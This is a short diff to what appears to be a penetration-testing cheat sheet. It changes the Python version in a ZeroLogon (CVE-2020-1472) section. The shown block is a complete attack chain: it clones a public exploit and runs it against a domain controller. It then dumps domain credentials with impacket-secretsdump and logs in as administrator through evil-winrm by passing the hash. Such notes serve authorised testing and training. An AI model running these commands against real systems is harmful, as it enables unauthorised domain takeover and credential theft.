@@ -180,7 +180,7 @@ ZeroLogon (CVE-2020-1472)
 ---
 ```bash
 git clone https://github.com/dirkjanm/CVE-2020-1472
-python3.11 cve-2020-1472-exploit.py $NB_NAME $TARGET_IP
+python3 cve-2020-1472-exploit.py $NB_NAME $TARGET_IP
 impacket-secretsdump -no-pass -just-dc $NB_NAME\$@$TARGET_IP\
 evil-winrm -u administrator -i $TARGET_IP -H $HASH
 ```
